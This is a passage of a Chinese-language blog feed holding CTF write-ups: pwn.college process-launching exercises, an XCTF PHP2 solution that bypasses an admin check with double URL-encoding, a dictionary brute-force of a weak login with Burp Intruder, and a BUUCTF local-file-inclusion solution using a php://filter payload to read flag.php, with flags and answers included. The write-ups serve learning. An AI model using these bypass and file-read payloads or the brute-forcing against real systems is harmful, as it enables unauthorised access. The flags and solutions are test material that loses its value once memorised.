class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ok, I am father, I will leave\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义用于执行特定二进制文件的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *argv[] = &#123; <span class="string">&quot;/challenge/embryoio_level35&quot;</span>, <span class="literal">NULL</span> &#125;;  <span class="comment">// 指定要执行的二进制文件和参数</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *file = <span class="string">&quot;/challenge/embryoio_level35&quot;</span>;  <span class="comment">// 二进制文件的路径</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 execvpe 函数执行指定的二进制文件，传递环境变量 envp</span></span><br><span class="line">    execvpe(file, argv, envp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv[], <span class="type">char</span> *env[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> childPid;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建子进程</span></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;  <span class="comment">// 在子进程中执行以下代码</span></span><br><span class="line">        childPid = getpid();  <span class="comment">// 获取子进程的PID</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child pid is %d\n&quot;</span>, childPid);  <span class="comment">// 输出子进程的PID</span></span><br><span class="line"></span><br><span class="line">        pwncollege();  <span class="comment">// 调用函数执行指定的二进制文件</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ok, I am child, I will leave\n&quot;</span>);  <span class="comment">// 子进程结束前输出信息</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  <span class="comment">// 在父进程中执行以下代码</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent pid is %d\n&quot;</span>, getpid());  <span class="comment">// 输出父进程的PID</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用 waitpid 函数等待子进程退出</span></span><br><span class="line">        waitpid(childPid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ok, I am father, I will leave\n&quot;</span>);  <span class="comment">// 父进程结束前输出信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Level③⑥"><a href="#Level③⑥" class="headerlink" title="Level③⑥"></a>Level③⑥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/challenge/embryoio_level36 | <span class="built_in">cat</span></span><br></pre></td></tr></table></figure><h3 id="Level③⑦"><a href="#Level③⑦" class="headerlink" title="Level③⑦"></a>Level③⑦</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/challenge/embryoio_level37 | grep</span><br></pre></td></tr></table></figure><h3 id="Level③⑧"><a href="#Level③⑧" class="headerlink" title="Level③⑧"></a>Level③⑧</h3><p>要先 <strong>&#x2F;bin&#x2F;bash</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/challenge/embryoio_level38 | sed -ep</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/challenge/embryoio_level38 | sed -e <span class="string">&#x27;s/pattern/replacement/g&#x27;</span></span><br><span class="line">sed 命令是一个强大的文本处理工具，用于对文本进行模式匹配和替换。在命令行中，使用 |（管道）将命令串联起来，可以将一个命令的输出作为另一个命令的输入。关于 sed 的 -e 选项用于指定要应用的替换操作。pattern 是要匹配的文本模式，replacement 是要替换的内容，g 表示全局替换（一行中的所有匹配都会被替换）。</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/challenge/embryoio_level38 | sed -n <span class="string">&#x27;/pwn/p&#x27;</span></span><br><span class="line">使用 `sed` 命令对输入的每一行进行处理：</span><br><span class="line"></span><br><span class="line">- `-n` 选项取消默认的输出行为，使得只有经过处理的行会被输出。</span><br><span class="line">- `/pwn/` 是一个正则表达式，用于匹配包含字符串 <span class="string">&quot;pwn&quot;</span> 的行。</span><br><span class="line">- `p` 是 `sed` 命令，用于输出匹配到的行。</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome&lt;/p&gt;
&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;



&lt;p&gt;ssh-keygen -f key -N ‘’这个质量生成公钥&lt;/p&gt;
&lt;p&gt;回到虚拟机&lt;/p&gt;
&lt;p&gt;ssh -i key &lt;a href=&quot;m</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>攻防世界Web</title>
    <link href="http://example.com/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/"/>
    <id>http://example.com/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/</id>
    <published>2023-03-13T07:15:21.552Z</published>
    <updated>2024-04-11T13:45:36.531Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome</p><meta name="referrer" content="no-referrer"/><h2 id="一、攻防世界PHP2详细解答"><a href="#一、攻防世界PHP2详细解答" class="headerlink" title="一、攻防世界PHP2详细解答"></a>一、攻防世界PHP2详细解答</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/4f5b1f4e9dae688c6325733666affff6.png" alt="img"></p><h3 id="1-进入环境"><a href="#1-进入环境" class="headerlink" title="1.进入环境"></a>1.进入环境</h3><p>看到一句话“Can you anthenticate to this website?”意思为：你能认证到这个网站吗？</p><p><img src="https://img-blog.csdnimg.cn/img_convert/055ab8d21925215fbb39bc931233b0e5.png" alt="img"></p><h3 id="2-burpsuite"><a href="#2-burpsuite" class="headerlink" title="2.burpsuite"></a>2.burpsuite</h3><p>用burpsuite抓包后也没有什么重要的信息o(一︿一+)o</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a91b4cf3fc079c1b57a12747186c0553.png" alt="img"></p><p>我们可以进入index.php，但页面并没有变化。</p><p>于是输入index.php开始有东西出来了。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/75f94568c3f583d2d5a017a6ef4965ec.png" alt="img"></p><p>在这里可能看的不明显，我们直接回到页面在后面+&#x2F;index.phps看看</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0188b5b682e717523d2dad59dacbc9f4.png" alt="img"></p><p>给出了一下代码</p><h3 id="3-解析代码"><a href="#3-解析代码" class="headerlink" title="3.解析代码"></a>3.解析代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure><p>只需一眼就可以看出这是一个 PHP 代码片段，用于检查用户是否具有访问网站的权限</p><ol><li>第一行是 PHP 的开头标记，表示 PHP 代码的开始。</li><li>第二行检查通过 URL 传递的 ‘id’ 参数的值是否等于 ‘admin’。如果它相等，则使用 ‘echo’ 函数显示消息“not allowed!”并使用 ‘exit’ 函数退出脚本。这是为了防止未经授权访问网站的管理员页面。</li><li>第六行使用 ‘urldecode’ 函数解码 ‘id’ 参数的 URL 编码值。</li><li>第七行检查 ‘id’ 参数的解码值是否等于 ‘admin’。如果它相等，则使用 ‘echo’ 函数显示消息“Access granted!”和一个密钥。</li><li>代码以 PHP 结束标记结束。</li></ol><p>咱们的目的就是求出这个密钥了( ¯▽¯；)</p><h3 id="4-但要注意的是这个函数urldecode"><a href="#4-但要注意的是这个函数urldecode" class="headerlink" title="4.但要注意的是这个函数urldecode"></a>4.但要注意的是这个函数<strong>urldecode</strong></h3><p><code>urldecode()</code> 是一个 PHP 函数，用于解码 URL 编码字符串。在 URL 中，一些字符是有特殊含义的，例如空格、问号、等号等。如果需要在 URL 中使用这些字符，就需要对其进行编码，将其转换成特定的编码格式。例如空格会被编码成 <code>%20</code>。<code>urldecode()</code> 函数可以将这些编码格式的字符解码回原始字符，以便使用或显示。</p><p>在上面的 PHP 代码片段中，<code>urldecode()</code> 函数用于解码传递的 ‘id’ 参数的 URL 编码值，以便后续判断 ‘id’ 参数的值是否等于 ‘admin’。</p><p>所以直接输入下面是不行的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:64170/?id=admin</span><br></pre></td></tr></table></figure><p>我们需要将admin进行转换，也就是进行url编码。</p><p>admin 的 URL 编码是 %61%64%6d%69%6e。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:64170/?id=%61%64%6d%69%6e</span><br></pre></td></tr></table></figure><p> 还是不行滴！</p><p>因为浏览器本身会进行因此url解码，这里相当于进行两次url解码，应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:64170/?id=%2561%2564%256d%2569256e</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/b4489ef8ec16bef527d23f75e0847451.png" alt="img"></p><p>最后也是得到结果了！＼( ^▽^ )／</p><h3 id="5-知识总结：-✿◡‿◡"><a href="#5-知识总结：-✿◡‿◡" class="headerlink" title="5.知识总结：(✿◡‿◡)"></a>5.知识总结：(✿◡‿◡)</h3><p><strong>1.后缀名为.phps的文件：phps即php source，phps文件就是php的源代码文件，通常用于提供给用户查看php代码，因为用户无法通过web浏览器直接查看到php文件的内容，所以需要用phps文件代替</strong></p><p>2.<strong>在传入参数时，浏览器会对非ASCII编码进行一次urlencode，结果在代码执行时，相当于id还是admin，所以我们在传参时需要进行两次URL编码</strong></p><p>3.在URL编码中， “%” 符号是一个特殊字符，它被用来表示接下来的两个字符是一个ASCII值的十六进制表示。因此，如果我们想要在URL中出现一个 “%” 符号本身，而不是它的特殊含义，那么我们需要对它进行编码。</p><p>4.对于 “admin” 字符串，在进行一次URL编码后，会得到 “%61%64%6d%69%6e” 这个字符串。如果我们想对其进行二次URL编码，可以使用 “%25” 来代替每个 “%” 符号。由于 “%25” 在URL编码中表示 “%” 符号，所以最终的二次URL编码结果为 “%2561%2564%256d%2569%256e”。</p><p>5.另一方面，如果我们将 “%25” 放在 “dmin” 前面，会得到 “%25dmin”。这个字符串也可以被解码为 “admin”。这是因为，在进行URL解码时，系统会先解码所有出现的 “%” 符号，然后再将剩下的字符串解码为原始字符。因此，”<strong>%25dmin</strong>“ 和 “<strong>%2564%6d%69%6e</strong>“ 都可以被解码为 “admin”。</p><h1 id="二、攻防世界weak-auth浅学"><a href="#二、攻防世界weak-auth浅学" class="headerlink" title="二、攻防世界weak_auth浅学"></a>二、攻防世界weak_auth浅学</h1><h3 id="1、进入环境"><a href="#1、进入环境" class="headerlink" title="1、进入环境"></a>1、进入环境</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/bf15d3dd090e744f1042f8fe674b9c4e.png" alt="img"></p><p>当我们点进去的时候，出来一个网页，让我们输入username和password，先随便输入一下，然后弹出是说让我们用admin作为username登入</p><p><img src="https://img-blog.csdnimg.cn/img_convert/538c90a5e8799e835863e17e4a8d5996.png" alt="img"></p><p>那我们就按照它的要求吧，进行修改</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b91d986e355c99163dc0316f9f56198d.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/d7b50ac0ad9f095dc9f4d073a6d42437.png" alt="img"></p><p>这次它只是提醒了密码错误，我们的重心开始在密码上，什么提示也没给，没思路。。。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8c1c6ddbfffb417922ae416fd00b3fa1.png" alt="img"></p><p>但是仔细想了想，总感觉怪怪的，他没有返回到原来的界面，事出反常必有妖，按一下F12，它给出了一段绿色的字体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">maybe you need a dictionary(或许你需要一个字典)</span><br></pre></td></tr></table></figure><p>字典，好了，瞬间清楚明了了。</p><h3 id="2-首先我们应该进行抓包"><a href="#2-首先我们应该进行抓包" class="headerlink" title="2.首先我们应该进行抓包"></a>2.首先我们应该进行抓包</h3><blockquote><p><strong>抓包（Packet Sniffing）是指通过监听网络数据包，来分析和获取网络通信的技术或行为。在网络通信中，数据包是信息传输的基本单位，抓包可以获取数据包中的各种信息，例如发送和接收的数据、通信的协议、源和目的地址等，从而帮助分析和监测网络流量，发现网络问题和安全漏洞。抓包常常被用于网络故障排查、网络安全检测、数据包分析和协议设计等领域。常用的抓包工具包括Wireshark、Tcpdump、Burp Suite等。</strong></p></blockquote><p>接下来我们就是应该用burpsuite进行字典爆破。首先先将那一页的代码发送到intruder</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ca8492cc37dc3c648d902ff2cf99b545.png" alt="img"></p><h3 id="3-紧接着在intruder里的payloads里选择runtime"><a href="#3-紧接着在intruder里的payloads里选择runtime" class="headerlink" title="3.紧接着在intruder里的payloads里选择runtime"></a>3.紧接着在intruder里的payloads里选择runtime</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/3513eb42f7f4d4e7cf1b0afd6fc4946d.png" alt="img"></p><p>选择你的字典，字典可以在这里下载<a href="https://www.somd5.com/download/dict/">字典</a></p><h3 id="4-步骤完成后，我们就可以进行爆破了。"><a href="#4-步骤完成后，我们就可以进行爆破了。" class="headerlink" title="4.步骤完成后，我们就可以进行爆破了。"></a>4.步骤完成后，我们就可以进行爆破了。</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/c1cda94c56cbee95f1b5f6c2dd7ac546.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/b82b575de7e10adca668a9ac7822caca.png" alt="img"></p><p>爆破后，我们可以看到上图里有一个长度与其他长度不同的，至于为什么正确的密码与其他的密码长度不同，我搜集了一些知识，希望有帮助。</p><blockquote><p><strong>在Burp Suite的字典爆破功能中，正确的密码与错误的密码在长度上可能是不同的，这可能由以下几个原因导致：</strong><br><strong>密码哈希算法的实现方式不同。不同的密码哈希算法可能会产生不同长度的哈希值，这可能会导致正确的密码哈希值长度与错误的密码哈希值长度不同。</strong><br><strong>在进行哈希计算时，使用的加盐方式不同。哈希计算时的加盐方式可能会影响哈希值长度，从而导致正确的密码哈希值长度与错误的密码哈希值长度不同。</strong><br><strong>密码本身的长度不同。如果正确的密码比错误的密码更长或更短，则其哈希值长度可能与错误的密码哈希值长度不同。</strong><br><strong>需要注意的是，密码哈希值长度不一定与密码本身长度相同。这是因为哈希算法的实现方式不同，会导致哈希值长度的差异。因此，在使用Burp Suite进行字典爆破时，我们需要考虑到以上的原因，并且针对具体情况进行调试和分析。</strong></p></blockquote><p>那我们输入123456，这就是密码，得到以下结果：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f451544a3725b81e73c5e35268b667ca.png" alt="img"></p><p>cyberpeace{89f86db4dcb3c9311ff8f2513065533e}</p><h3 id="5-知识总结o-一︿一"><a href="#5-知识总结o-一︿一" class="headerlink" title="5.知识总结o(一︿一+)"></a>5.知识总结o(一︿一+)</h3><p>一、在CTF的Web题目中，有很多涉及到密码爆破的题目，一般可以从以下几个方面来判断密码爆破类型：</p><ol><li><p>题目描述：通常题目描述中会给出一些提示，例如提示破解某个服务的密码，或者提示破解某个加密算法的密钥等。这些提示可以帮助我们确定密码爆破的类型。</p></li><li><p>请求响应：在使用Burp Suite等工具进行抓包分析时，可以查看请求响应，观察是否有类似密码错误、尝试次数限制等提示信息，或者观察是否有重复的请求，这些都可能是密码爆破的线索。</p></li><li><p>加密算法：如果题目中涉及到密码加密算法，可以通过分析算法的特点来判断密码爆破类型。例如，如果使用的是MD5加密算法，那么就可能是直接爆破明文密码或者使用彩虹表进行破解。</p></li><li><p>字典文件：如果题目中要求使用字典文件进行密码破解，那么可以判断为字典密码爆破类型。此时需要注意字典文件的大小和内容是否符合要求。</p></li></ol><p>总之，在CTF的Web题目中，需要通过分析题目描述、请求响应、加密算法和字典文件等方面，来判断密码爆破的类型，然后选择相应的工具和策略来进行破解。同时，需要遵守比赛规则，合法合规地进行破解。</p><p>二、Burp Suite是一个强大的Web应用程序安全测试工具，它包括多个模块，其中之一是字典密码爆破模块。这个模块可以通过自动化的方式，在用户提供的字典文件中尝试所有可能的密码组合，以破解用户的密码。</p><p>总结一下Burp Suite字典密码爆破的一些特点：</p><ol><li><p>字典文件：Burp Suite字典密码爆破模块需要用户提供一个包含所有可能密码的字典文件。字典文件可以是一个简单的文本文件，每行包含一个密码。</p></li><li><p>多种破解技术：Burp Suite字典密码爆破模块支持多种破解技术，包括暴力破解、智能破解和组合破解等。不同的破解技术可以根据不同的场景和要求进行选择。</p></li><li><p>配置选项：Burp Suite字典密码爆破模块还提供了多种配置选项，例如：破解时使用的线程数、HTTP响应超时时间、是否跟踪成功的登录请求等。</p></li><li><p>破解速度：Burp Suite字典密码爆破模块的破解速度取决于多个因素，例如字典文件的大小、目标应用程序的响应速度、破解时使用的线程数等。可以通过调整这些参数来提高破解速度。</p></li><li><p>使用注意事项：在使用Burp Suite字典密码爆破模块时，需要注意一些使用注意事项，例如：合理设置请求间隔时间、控制破解请求的数量、合理设置破解技术和字典文件等。此外，需要遵守法律法规和道德规范，仅在授权的范围内使用此工具。</p></li></ol><p>总之，Burp Suite字典密码爆破模块是一个功能强大的工具，可以帮助安全测试人员发现应用程序的密码漏洞，但需要谨慎使用。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome&lt;/p&gt;
&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;一、攻防世界PHP2详细解答&quot;&gt;&lt;a href=&quot;#一、攻防世界PHP2详细解答&quot; class=&quot;headerlink&quot; title=&quot;一、</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>buuctfWeb</title>
    <link href="http://example.com/2023/03/05/web/"/>
    <id>http://example.com/2023/03/05/web/</id>
    <published>2023-03-04T22:12:03.249Z</published>
    <updated>2023-08-10T06:20:31.034Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome</p><meta name="referrer" content="no-referrer"/><h1 id="一、-极客大挑战-2019-Secret-File-1解题思路"><a href="#一、-极客大挑战-2019-Secret-File-1解题思路" class="headerlink" title="一、[极客大挑战 2019]Secret File 1解题思路"></a>一、[极客大挑战 2019]Secret File 1解题思路</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/7a7ca8cd81dfdde9a0379ea84d0d335c.png" alt="img"></p><h3 id="1-开启靶机"><a href="#1-开启靶机" class="headerlink" title="1.开启靶机"></a>1.开启靶机</h3><p>开启靶机后进入网址，没有什么好的信息</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6c5094598fefd7dd7333e2632ebff1d3.png" alt="img"></p><h3 id="2-按F12查看源代码"><a href="#2-按F12查看源代码" class="headerlink" title="2.按F12查看源代码"></a>2.按F12查看源代码</h3><p>发现了一个网址.&#x2F;Archive_room.php按CTRL键点击即可进入，可以看到</p><p><img src="https://img-blog.csdnimg.cn/img_convert/240faba07eaf97b3e701de1e7da7fca1.png" alt="img"></p><p>点击这个SECRET并没有发生什么，后面倒是说“查阅结束”，那么就说明，速度很快，肉眼看不到，那我们就要借用工具burpsuite。首先下开启代理服务器</p><h3 id="3-使用burpsuite"><a href="#3-使用burpsuite" class="headerlink" title="3.使用burpsuite"></a>3.使用burpsuite<img src="https://img-blog.csdnimg.cn/img_convert/ec786b401fe133c346e66ee47ba7a2ab.png" alt="img"></h3><p><img src="https://img-blog.csdnimg.cn/img_convert/efb7f0e3de717041c1ac19d352dbbc9a.png" alt="img"></p><p>进入到这个界面，软件中应该显示出获取的信息，点击forward直到信息中出现action.php(根据源代码提示)</p><p><img src="https://img-blog.csdnimg.cn/img_convert/906cd9cf375e974f7f0ec1d4740c68a2.png" alt="img"></p><p>接着将这串数据发送到repeater，在repeater里我们点击Go就进入到下面的界面</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ca09d303bef3505fbb8cea397dd330fb.png" alt="img"></p><p>后面的话我们就可以输入网址<a href="http://78b3b06a-804f-46c6-8d85-8635948e27ad.node4.buuoj.cn/secr3t.php%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%88%E8%AE%B0%E7%9D%80%E8%A6%81%E5%B0%86burpsuite%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91%E5%85%B3%E9%97%AD%EF%BC%8C%E5%90%A6%E5%88%99%E6%98%AF%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%EF%BC%89">http://78b3b06a-804f-46c6-8d85-8635948e27ad.node4.buuoj.cn/secr3t.php可以查看源代码（记着要将burpsuite和局域网关闭，否则是打不开的）</a></p><p><img src="https://img-blog.csdnimg.cn/img_convert/c1b5cbae463c8b351a02d691e55dc88b.png" alt="img"></p><h3 id="4-代码解释"><a href="#4-代码解释" class="headerlink" title="4.代码解释"></a>4.代码解释</h3><p>这是一个PHP脚本，以HTML标签开头。该脚本包含了一个PHP函数 <code>highlight_file(__FILE__)</code>，该函数可以高亮正在执行的PHP代码。</p><p>然后，该脚本设置了 <code>error_reporting(0)</code>，以关闭错误报告。</p><p>该脚本通过 <code>$_GET</code> 超全局变量接收一个文件名作为参数。然后它检查文件名是否包含以下任何字符串： “..&#x2F;“、”tp”、”input” 或 “data”。如果包含，则脚本会打印 “Oh no!” 并退出。这是一种安全措施，用于防止目录遍历攻击并保护服务器免受恶意文件包含的攻击。</p><p>如果文件名通过了安全检查，该脚本将使用 <code>include</code> 语句包含该文件。被包含的文件的内容将作为PHP代码执行。</p><p>标志存储在名为 “flag.php” 的文件中，该文件可能由此脚本包含。</p><h3 id="5-PHP伪协议"><a href="#5-PHP伪协议" class="headerlink" title="5.PHP伪协议"></a>5.PHP伪协议</h3><p>看到flag.php应该联想到<a href="https://segmentfault.com/a/1190000018991087">php伪协议</a>，在后面加上<br>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php即可。</p><p>这是因为 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode 是一种 PHP 伪协议，用于将文件转换为 base64 格式。通过在 $_GET 超全局变量中传递 file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php，我们可以读取 flag.php 文件的内容并将其转换为 base64 格式。然后，我们可以将该内容解码并查看其中是否包含有用的信息。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d215ff68e0fb087898bcc6696330a751.png" alt="img"></p><p>就会给出一堆符号的组合，显然这是base64的密文，接着在base64解密下即可求得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7Mzk2MDEzYmItZjRkNC00NThjLWJmYWItYzhmODk4ZmI4Zjc0fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</span><br></pre></td></tr></table></figure><h3 id="6-解密得到flag"><a href="#6-解密得到flag" class="headerlink" title="6.解密得到flag"></a>6.解密得到flag</h3><p>base64在线解密网址：<a href="http://www.jsons.cn/base64/">http://www.jsons.cn/base64/</a></p><p><img src="https://img-blog.csdnimg.cn/img_convert/ee9459a1e82c5da4c32442d8ca09f316.png" alt="img"></p><p>flag为flag{396013bb-f4d4-458c-bfab-c8f898fb8f74}</p><h2 id="7、总结"><a href="#7、总结" class="headerlink" title="7、总结"></a>7、总结</h2><p>在做这道题的时候，主要是会使用burpsuite工具，并且还要了解PHP伪协议的一些知识及概念，最后还用到了一些密码里的base64，这些都需要了解一下。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome&lt;/p&gt;
&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h1 id=&quot;一、-极客大挑战-2019-Secret-File-1解题思路&quot;&gt;&lt;a href=&quot;#一、-极客大挑战-2019-Secret-File-1</summary>
      
    
    
    
